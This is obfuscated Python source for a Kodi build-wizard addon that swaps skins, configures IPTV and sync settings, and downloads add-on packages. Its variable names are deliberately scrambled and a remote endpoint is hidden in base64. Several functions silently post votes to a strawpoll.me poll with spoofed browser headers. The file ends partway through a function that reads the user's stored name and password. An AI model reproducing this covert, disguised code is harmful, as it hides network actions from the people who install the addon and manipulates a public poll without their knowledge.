# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZpcDIwMC9CdWlsZC9tYXN0ZXIvcmVtb3ZlYWRkb25z'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZpcDIwMC9CdWlsZC9tYXN0ZXIvcmVtb3ZlYWRkb25z'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:252
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OOOO0OO00O0O0O0OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OOO0O00OOOOO000OO =[];O00O00OOOO0O0OOO0 =[]#line:266
	for O000O00O0O0OO0000 in sorted (OOOO0OO00O0O0O0OO ,key =lambda OOO0OOO0OO000000O :OOO0OOO0OO000000O ):#line:267
		OOOO0OOO0O0O00000 =os .path .split (O000O00O0O0OO0000 [:-1 ])[1 ]#line:268
		O0O00O0O0O00OO0OO =os .path .join (O000O00O0O0OO0000 ,'addon.xml')#line:269
		if os .path .exists (O0O00O0O0O00OO0OO ):#line:270
			O00000000OOOOOOOO =open (O0O00O0O0O00OO0OO )#line:271
			OO00OO0OO0O000OOO =O00000000OOOOOOOO .read ()#line:272
			O0O0OO000O0OOOOO0 =parseDOM2 (OO00OO0OO0O000OOO ,'addon',ret ='id')#line:273
			O00000O000O000O00 =OOOO0OOO0O0O00000 if len (O0O0OO000O0OOOOO0 )==0 else O0O0OO000O0OOOOO0 [0 ]#line:274
			try :#line:275
				O000O000OOOOOO0OO =xbmcaddon .Addon (id =O00000O000O000O00 )#line:276
				OOO0O00OOOOO000OO .append (O000O000OOOOOO0OO .getAddonInfo ('name'))#line:277
				O00O00OOOO0O0OOO0 .append (O00000O000O000O00 )#line:278
			except :#line:279
				pass #line:280
	O00OOO0OO0O000O00 =[];O00OOOO000O0OOOO0 =0 #line:281
	OO000O0000OO00OOO =["Current Skin -- %s"%currSkin ()]+OOO0O00OOOOO000OO #line:282
	O00OOOO000O0OOOO0 =DIALOG .select ("Select the Skin you want to swap with.",OO000O0000OO00OOO )#line:283
	if O00OOOO000O0OOOO0 ==-1 :return #line:284
	else :#line:285
		O00O00O0OOOO0OO0O =(O00OOOO000O0OOOO0 -1 )#line:286
		O00OOO0OO0O000O00 .append (O00O00O0OOOO0OO0O )#line:287
		OO000O0000OO00OOO [O00OOOO000O0OOOO0 ]="%s"%(OOO0O00OOOOO000OO [O00O00O0OOOO0OO0O ])#line:288
	if O00OOO0OO0O000O00 ==None :return #line:289
	for OOO0OOO000OOO0O0O in O00OOO0OO0O000O00 :#line:290
		swapSkins (O00O00OOOO0O0OOO0 [OOO0OOO000OOO0O0O ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (O0OOOO0OO0OO0000O ,title ="Error"):#line:295
	O0O0OO000OO00O00O ='lookandfeel.skin'#line:296
	OOOOOOO00OO00O0OO =O0OOOO0OO0OO0000O #line:297
	O0OO00O0OOOO0OO00 =getOld (O0O0OO000OO00O00O )#line:298
	OO0OOOOO0O0OOO0O0 =O0O0OO000OO00O00O #line:299
	setNew (OO0OOOOO0O0OOO0O0 ,OOOOOOO00OO00O0OO )#line:300
	O000000000O000000 =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000000000O000000 <100 :#line:302
		O000000000O000000 +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (OOOOO000O0OO00OOO ):#line:309
	try :#line:310
		OOOOO000O0OO00OOO ='"%s"'%OOOOO000O0OO00OOO #line:311
		O00O0000OOOOOO0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOOO000O0OO00OOO )#line:312
		O000OO0O0O000OO0O =xbmc .executeJSONRPC (O00O0000OOOOOO0O0 )#line:314
		O000OO0O0O000OO0O =simplejson .loads (O000OO0O0O000OO0O )#line:315
		if O000OO0O0O000OO0O .has_key ('result'):#line:316
			if O000OO0O0O000OO0O ['result'].has_key ('value'):#line:317
				return O000OO0O0O000OO0O ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (O0O0OOO0O0OOOO000 ,OO0OO0O00O0OOOO00 ):#line:324
	try :#line:325
		O0O0OOO0O0OOOO000 ='"%s"'%O0O0OOO0O0OOOO000 #line:326
		OO0OO0O00O0OOOO00 ='"%s"'%OO0OO0O00O0OOOO00 #line:327
		OO0000OOO0OO00000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O0OOO0O0OOOO000 ,OO0OO0O00O0OOOO00 )#line:328
		O0000OO0OOOOO0OOO =xbmc .executeJSONRPC (OO0000OOO0OO00000 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O0000OOOOOOOOO0OO =xbmcgui .DialogProgress ()#line:339
			O0000OOOOOOOOO0OO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O0000OOOOOOOOO0OO .update (0 )#line:343
			for OO00OO0OOO00O0OOO in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O0000OOOOOOOOO0OO .update (int ((5 -OO00OO0OOO00O0OOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO00OO0OOO00O0OOO ),'')#line:346
				if O0000OOOOOOOOO0OO .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O0000OOOOOOOOO0OO =xbmcgui .DialogProgress ()#line:352
			O0000OOOOOOOOO0OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O0000OOOOOOOOO0OO .update (0 )#line:356
			for OO00OO0OOO00O0OOO in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O0000OOOOOOOOO0OO .update (int ((5 -OO00OO0OOO00O0OOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO00OO0OOO00O0OOO ),'')#line:359
				if O0000OOOOOOOOO0OO .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O0OO0OOO000O000O0 ='18773068'#line:372
    O0OO00000O0O0000O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OO0OOO000O000O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OOO000O0OOO0OOOOO ='145273320'#line:386
    O0OO0O00O0OOOOO0O ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        OOO0OOO00O0000O00 =OOO000O0OOO0OOOOO #line:389
    else :#line:390
        OOO0OOO00O0000O00 =O0OO0O00O0OOOOO0O #line:391
    O00000OOOO00O00OO ={'options':OOO0OOO00O0000O00 }#line:395
    O0OO00O0O00OOO0OO =requests .post ('https://www.strawpoll.me/'+O0OO0OOO000O000O0 ,headers =O0OO00000O0O0000O ,data =O00000OOOO00O00OO )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        O0O0OOO0000OO0O00 ='18773068'#line:401
        O000O0O0O00000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOO0000OO0O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O0OOOOOOOOO0O0000 ='145273320'#line:415
        O00000O00O0OO0000 ={'options':O0OOOOOOOOO0O0000 }#line:421
        O0OO0O000O0OOO000 =requests .post ('https://www.strawpoll.me/'+O0O0OOO0000OO0O00 ,headers =O000O0O0O00000O0O ,data =O00000O00O0OO0000 )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O0O0O0000O000O00O ='18773068'#line:428
        OOOOO00O00OO0OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0O0000O000O00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O00OOOO0O00O00O0O ='145273321'#line:442
        OO00OO0OOOO00OO00 ={'options':O00OOOO0O00O00O0O }#line:448
        OOO00O00O0OOOO0OO =requests .post ('https://www.strawpoll.me/'+O0O0O0000O000O00O ,headers =OOOOO00O00OO0OOOO ,data =OO00OO0OOOO00OO00 )#line:450
   except :pass #line:451
def testcommand ():#line:455
 O0OO000O0O00O000O =os .path .dirname (os .path .realpath (__file__ ))#line:456
 O0O000O0OO0O0OOO0 =os .path .join (O0OO000O0O00O000O ,'changelog.txt')#line:457
 O0OO0OO0000O00OO0 =open (O0O000O0OO0O0OOO0 ,'r')#line:458
 OO00O0O000O0O0O0O =O0OO0OO0000O00OO0 .read ()#line:459
 O00O0O0000OOO0OO0 =OO00O0O000O0O0O0O #line:460
 notify .updateinfo (O00O0O0000OOO0OO0 ,True )#line:461
def skin_homeselect ():#line:462
	try :#line:464
		OO0OOO0OO0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:465
		OO000OO0000OOO0OO =open (OO0OOO0OO0000OOO0 ,'r')#line:467
		O000O0O00000000O0 =OO000OO0000OOO0OO .read ()#line:468
		OO000OO0000OOO0OO .close ()#line:469
		OO0OOOOO000O0O00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:470
		OOO0000OO0OOOO0OO =re .compile (OO0OOOOO000O0O00O ).findall (O000O0O00000000O0 )[0 ]#line:471
		OO000OO0000OOO0OO =open (OO0OOO0OO0000OOO0 ,'w')#line:472
		OO000OO0000OOO0OO .write (O000O0O00000000O0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOO0000OO0OOOO0OO ,'<setting id="HomeS" type="string"></setting>'))#line:473
		OO000OO0000OOO0OO .close ()#line:474
	except :#line:475
		pass #line:476
def autotrakt ():#line:479
    O00000O0O00O000OO =(ADDON .getSetting ("auto_trk"))#line:480
    if O00000O0O00O000OO =='true':#line:481
       from resources .libs import trk_aut #line:482
def traktsync ():#line:484
     OOO0000O00000OOOO =(ADDON .getSetting ("auto_trk"))#line:485
     if OOO0000O00000OOOO =='true':#line:486
       from resources .libs import trk_aut #line:489
     else :#line:490
        ADDON .openSettings ()#line:491
def imdb_synck ():#line:493
   try :#line:494
     O00OOOO00O0000OOO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:495
     OO00O0OOO0O000OOO =xbmcaddon .Addon ('plugin.video.gaia')#line:496
     O0OOOO0000O0O000O =(ADDON .getSetting ("imdb_sync"))#line:497
     OOOO0O00O0O0000OO ="imdb.user"#line:498
     OO0O0OO0OOOO0OOOO ="accounts.informants.imdb.user"#line:499
     O00OOOO00O0000OOO .setSetting (OOOO0O00O0O0000OO ,str (O0OOOO0000O0O000O ))#line:500
     OO00O0OOO0O000OOO .setSetting ('accounts.informants.imdb.enabled','true')#line:501
     OO00O0OOO0O000OOO .setSetting (OO0O0OO0OOOO0OOOO ,str (O0OOOO0000O0O000O ))#line:502
   except :pass #line:503
def dis_or_enable_addon (OO000OOOOO0O0O0OO ,O000000OOO0OOO0O0 ,enable ="true"):#line:505
    import json #line:506
    OO00O00OOO0O0O0O0 ='"%s"'%OO000OOOOO0O0O0OO #line:507
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO000OOOOO0O0O0OO )and enable =="true":#line:508
        logging .warning ('already Enabled')#line:509
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO000OOOOO0O0O0OO )#line:510
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO000OOOOO0O0O0OO )and enable =="false":#line:511
        return xbmc .log ("### Skipped %s, reason = not installed"%OO000OOOOO0O0O0OO )#line:512
    else :#line:513
        O0OO00O0O0OO0O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00O00OOO0O0O0O0 ,enable )#line:514
        OO00OOOOOO00000OO =xbmc .executeJSONRPC (O0OO00O0O0OO0O000 )#line:515
        O0OO0O00O000O000O =json .loads (OO00OOOOOO00000OO )#line:516
        if enable =="true":#line:517
            xbmc .log ("### Enabled %s, response = %s"%(OO000OOOOO0O0O0OO ,O0OO0O00O000O000O ))#line:518
        else :#line:519
            xbmc .log ("### Disabled %s, response = %s"%(OO000OOOOO0O0O0OO ,O0OO0O00O000O000O ))#line:520
    if O000000OOO0OOO0O0 =='auto':#line:521
     return True #line:522
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:523
def iptvset ():#line:526
  try :#line:527
    O0O00000OO0O0000O =(ADDON .getSetting ("iptv_on"))#line:528
    if O0O00000OO0O0000O =='true':#line:530
       if KODIV >=17 and KODIV <18 :#line:532
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:533
         OO0OO0O0OOOO00OO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:534
         O0OO0OOO0OO0OO0O0 =(ADDON .getSetting ("iptvUrl"))#line:536
         OO0OO0O0OOOO00OO0 .setSetting ('m3uUrl',O0OO0OOO0OO0OO0O0 )#line:537
         O0O000OOOO0000O00 =(ADDON .getSetting ("epg_Url"))#line:538
         OO0OO0O0OOOO00OO0 .setSetting ('epgUrl',O0O000OOOO0000O00 )#line:539
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:542
         iptvsimpldownpc ()#line:543
         wiz .kodi17Fix ()#line:544
         xbmc .sleep (1000 )#line:545
         OO0OO0O0OOOO00OO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:546
         O0OO0OOO0OO0OO0O0 =(ADDON .getSetting ("iptvUrl"))#line:547
         OO0OO0O0OOOO00OO0 .setSetting ('m3uUrl',O0OO0OOO0OO0OO0O0 )#line:548
         O0O000OOOO0000O00 =(ADDON .getSetting ("epg_Url"))#line:549
         OO0OO0O0OOOO00OO0 .setSetting ('epgUrl',O0O000OOOO0000O00 )#line:550
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:552
         iptvsimpldown ()#line:553
         wiz .kodi17Fix ()#line:554
         xbmc .sleep (1000 )#line:555
         OO0OO0O0OOOO00OO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:556
         O0OO0OOO0OO0OO0O0 =(ADDON .getSetting ("iptvUrl"))#line:557
         OO0OO0O0OOOO00OO0 .setSetting ('m3uUrl',O0OO0OOO0OO0OO0O0 )#line:558
         O0O000OOOO0000O00 =(ADDON .getSetting ("epg_Url"))#line:559
         OO0OO0O0OOOO00OO0 .setSetting ('epgUrl',O0O000OOOO0000O00 )#line:560
  except :pass #line:561
def howsentlog ():#line:568
       try :#line:569
          import json #line:570
          O0O0OO00O00OOO0OO =(ADDON .getSetting ("user"))#line:571
          OOO0OO0O0O0OOO0O0 =(ADDON .getSetting ("pass"))#line:572
